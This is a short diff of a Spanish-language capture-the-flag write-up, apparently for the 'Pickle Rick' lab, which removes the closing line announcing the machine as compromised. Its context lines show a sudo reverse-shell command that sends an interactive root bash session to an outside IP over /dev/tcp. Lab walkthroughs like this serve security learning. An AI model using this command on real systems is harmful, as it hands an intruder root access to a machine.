@@ -40,4 +40,4 @@ published : True
 * <p>Entonces me hago una reverse Shell con el sudo</p>
 > sudo /bin/bash -c "bash -i >& /dev/tcp/10.18.27.215/445 0>&1"
 <img src="/imgs/pickleRick/pickleRick10.jpg"/>
-* <p>Ok maquina <font color="red">Vulnerada</font></p>
+
